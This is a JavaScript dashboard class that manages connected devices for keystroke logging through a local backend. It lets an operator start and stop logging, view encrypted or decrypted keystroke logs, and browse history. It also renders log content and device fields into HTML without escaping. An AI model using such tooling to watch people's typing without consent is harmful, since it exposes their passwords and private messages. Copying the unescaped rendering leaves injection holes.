class DeviceManager {
    constructor() {
        this.devicesList = document.querySelector('#devices');
        this.historyOutput = document.querySelector('#history-content');
        this.osButtons = document.querySelectorAll('.os-type-item');
        this.activeDevice = null;
        
        // Initialize OS selection
        this.osButtons.forEach(button => {
            if (!button.classList.contains('disabled')) {  // Only enable if not disabled
                button.addEventListener('click', () => this.handleOSSelection(button));
            }
        });
        
        // Start periodic updates
        this.updateDevices();
        this.updateHistory();
        setInterval(() => this.updateDevices(), 5000);
    }

    async handleOSSelection(button) {
        const osType = button.dataset.os;
        
        try {
            // Disable all OS buttons during connection
            this.osButtons.forEach(btn => btn.disabled = true);
            
            const response = await fetch('http://localhost:5001/connect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ osType })
            });
            
            const data = await response.json();
            
            if (data.status === 'success') {
                this.activeDevice = data.deviceId;
                
                // Update UI
                this.osButtons.forEach(btn => {
                    btn.classList.remove('active-os');
                    if (btn === button) {
                        btn.classList.add('active-os');
                    }
                });
                
                // Show devices section
                const devicesSection = document.querySelector('#devices');
                if (devicesSection) {
                    devicesSection.classList.remove('hidden');
                }
                
                await this.updateDevices();
            } else {
                throw new Error(data.message || 'Connection failed');
            }
        } catch (error) {
            console.error('Error connecting device:', error);
            alert(`Failed to connect ${osType} device: ${error.message}`);
        } finally {
            // Re-enable OS buttons
            this.osButtons.forEach(btn => {
                if (!btn.classList.contains('disabled')) {
                    btn.disabled = false;
                }
            });
        }
    }

    async toggleLogging(deviceId, action) {
        try {
            const button = document.querySelector(`[data-device="${deviceId}"] .${action}-btn`);
            if (button) button.disabled = true;

            const response = await fetch(`http://localhost:5001/${action}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId })
            });

            const data = await response.json();
            
            if (data.status === 'success') {
                await this.updateDevices();
                await this.updateHistory();
            } else {
                throw new Error(data.message || `Failed to ${action} logging`);
            }
        } catch (error) {
            console.error(`Error ${action} logging:`, error);
            alert(`Failed to ${action} logging: ${error.message}`);
        }
    }

    async viewLogs(deviceId, button) {
        const logOutput = document.querySelector(`#logs-${deviceId}`);
        const isEncrypted = button.dataset.encrypted === 'true';
        
        try {
            button.disabled = true;
            logOutput.innerHTML = '<div class="loading">Loading logs...</div>';
            
            const endpoint = isEncrypted ? 'logs' : 'logs/decrypted';
            const response = await fetch(`http://localhost:5001/${endpoint}/${deviceId}`);
            const data = await response.json();
            
            if (data.logs) {
                logOutput.innerHTML = this.formatLogs(data.logs, isEncrypted);
                button.textContent = isEncrypted ? 'View Decrypted Logs' : 'View Encrypted Logs';
                button.dataset.encrypted = !isEncrypted;
            } else {
                logOutput.innerHTML = '<div class="empty-state">No logs available</div>';
            }
        } catch (error) {
            console.error('Error fetching logs:', error);
            logOutput.innerHTML = '<div class="error-state">Failed to load logs</div>';
        } finally {
            button.disabled = false;
        }
    }

    formatLogs(logs, isEncrypted) {
        if (isEncrypted) {
            return `<pre class="encrypted-logs">${logs}</pre>`;
        }
        
        // Format decrypted logs with timestamps and key formatting
        return logs.split('\n').map(line => {
            const timestamp = new Date().toISOString();
            return `<div class="log-entry">
                <span class="timestamp">[${timestamp}]</span>
                <span class="content">${this.formatKeystrokes(line)}</span>
            </div>`;
        }).join('');
    }

    formatKeystrokes(text) {
        // Format special keys
        return text
            .replace(/\[←\]/g, '<span class="key">⌫</span>')
            .replace(/\[→\]/g, '<span class="key">→</span>')
            .replace(/\[↑\]/g, '<span class="key">↑</span>')
            .replace(/\[↓\]/g, '<span class="key">↓</span>')
            .replace(/\[Space\]/g, '<span class="key">␣</span>')
            .replace(/\[Enter\]/g, '<span class="key">⏎</span>');
    }

    async deactivateDevice(deviceId) {
        try {
            const response = await fetch('http://localhost:5001/deactivate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ deviceId })
            });
            
            const data = await response.json();
            
            if (response.ok) {
                // Remove device from UI
                const deviceElement = document.querySelector(`[data-device="${deviceId}"]`);
                if (deviceElement) {
                    deviceElement.remove();
                }
                
                // Update devices list
                await this.updateDevices();
                
                // Show success message
                alert('Device deactivated successfully');
            } else {
                throw new Error(data.message || 'Device not found');
            }
        } catch (error) {
            console.error('Error deactivating device:', error);
            alert(`Failed to deactivate device: ${error.message}`);
        }
    }

    renderDevices(devices) {
        this.devicesList.innerHTML = devices.length ? '' : 
            '<div class="empty-state">No devices connected</div>';

        devices.forEach(device => {
            const deviceEl = document.createElement('div');
            deviceEl.className = 'device-item';
            deviceEl.dataset.device = device.id;
            
            deviceEl.innerHTML = `
                <div class="device-info">
                    <span class="device-name">${device.name}</span>
                    <span class="device-id">ID: ${device.id}</span>
                    <span class="device-status ${device.status}">${device.status}</span>
                </div>
                <div class="device-controls">
                    <button onclick="deviceManager.toggleLogging('${device.id}', 'start')" 
                            class="control-btn start-btn" 
                            ${device.status === 'active' ? 'disabled' : ''}>
                        Start Logging
                    </button>
                    <button onclick="deviceManager.toggleLogging('${device.id}', 'stop')" 
                            class="control-btn stop-btn"
                            ${device.status !== 'active' ? 'disabled' : ''}>
                        Stop Logging
                    </button>
                    <button onclick="deviceManager.viewLogs('${device.id}', this)" 
                            class="control-btn view-btn"
                            data-encrypted="true">
                        View Encrypted Logs
                    </button>
                    <button onclick="deviceManager.deactivateDevice('${device.id}')" 
                            class="control-btn deactivate">
                        Deactivate Device
                    </button>
                </div>
                <div id="logs-${device.id}" class="logs-output"></div>
            `;
            
            this.devicesList.appendChild(deviceEl);
        });
    }

    async updateDevices() {
        try {
            const response = await fetch('http://localhost:5001/devices');
            const data = await response.json();
            
            if (data.status === 'success') {
                this.renderDevices(data.devices);
            } else {
                throw new Error(data.message || 'Failed to fetch devices');
            }
        } catch (error) {
            console.error('Error updating devices:', error);
        }
    }

    async updateHistory() {
        try {
            const response = await fetch('http://localhost:5001/history');
            const data = await response.json();
            
            if (data.status === 'success') {
                this.renderHistory(data.history);
            } else {
                throw new Error(data.message || 'Failed to fetch history');
            }
        } catch (error) {
            console.error('Error updating history:', error);
        }
    }

    renderHistory(history) {
        if (!this.historyOutput) return;
        
        this.historyOutput.innerHTML = history.length ? '' : 
            '<div class="empty-state">No history available</div>';

        history.forEach(entry => {
            const historyEl = document.createElement('div');
            historyEl.className = 'history-entry';
            
            historyEl.innerHTML = `
                <div class="history-header" onclick="this.nextElementSibling.classList.toggle('hidden')">
                    <div class="history-summary">
                        <span class="timestamp">${entry.date}</span>
                        <span class="device-id">Device: ${entry.deviceId}</span>
                    </div>
                    <i class="fas fa-chevron-down history-toggle"></i>
                </div>
                <div class="history-content hidden">
                    <pre>${entry.content}</pre>
                </div>
            `;
            
            this.historyOutput.appendChild(historyEl);
        });
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.deviceManager = new DeviceManager();
}); 